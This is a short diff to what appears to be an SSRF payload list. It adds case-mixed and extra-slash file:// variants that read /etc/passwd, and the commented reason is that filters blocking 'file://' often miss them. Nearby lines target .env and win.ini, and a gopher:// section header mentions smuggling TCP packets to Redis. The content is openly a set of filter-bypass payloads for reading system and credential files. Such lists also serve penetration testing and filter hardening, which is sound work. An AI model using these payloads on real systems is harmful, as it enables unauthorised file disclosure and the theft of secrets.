@@ -36,6 +36,12 @@ file:///var/www/html/.env
 file:///c:/windows/win.ini
 file://\/\/etc/passwd
 file:/etc/passwd
+# parser-differential: case-mixed and extra-slash scheme variants - a filter that
+# blocks "file://" often misses these (seen on THM/real apps alike)
+File:///etc/passwd
+FILE:///etc/passwd
+filE:///etc/passwd
+file:////etc/passwd
 
 # ---------- gopher:// (smuggling arbitrary TCP packets) ----------
 # Redis example: run PING (craft the real payload URL-encoded in the field)
